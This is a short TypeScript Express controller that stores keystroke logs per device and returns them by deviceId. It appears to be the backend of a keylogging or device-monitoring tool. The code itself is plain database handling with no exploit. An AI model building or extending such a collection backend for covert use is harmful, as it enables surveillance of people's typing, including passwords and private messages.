import { Request, Response } from "express";
import { validationResult } from "express-validator";
import KeyLogs from "../models/keylogs.model";
import { KeyLogsModelType } from "../utils";

// Add New KeyLogs
export const addNewKeyLogs = async (data: any) => {
	try {
		const { deviceId, keyLogsType, keylogs, event } = data;

		const newKeyLog: KeyLogsModelType = new KeyLogs({
			deviceId,
			keyLogsType,
			keylogs: keylogs || "None",
			keyevent: event || "None",
		});

		await newKeyLog.save();

		return { status: 200, message: "Key logs added successfully" };
	} catch (error) {
		console.error("Error adding key logs:", error);
		return { status: 500, error: "Failed to add key logs" };
	}
};

// Get Key Logs by DeviceId
export const getKeyLogs = async (req: Request, res: Response) => {
	const errors = validationResult(req);
	if (!errors.isEmpty()) {
		return res.status(400).json({ errors: errors.array() });
	}
	try {
		const { deviceId } = req.params;

		//Find device in the database that match the query by deviceId
		const keylogs: KeyLogsModelType[] = await KeyLogs.find({
			deviceId,
		});

		res.status(200).json(keylogs);
	} catch (error) {
		console.error("Error processing Keylogs:", error);
		res.status(500).json({ error: "Failed to process the keylogs" });
	}
};
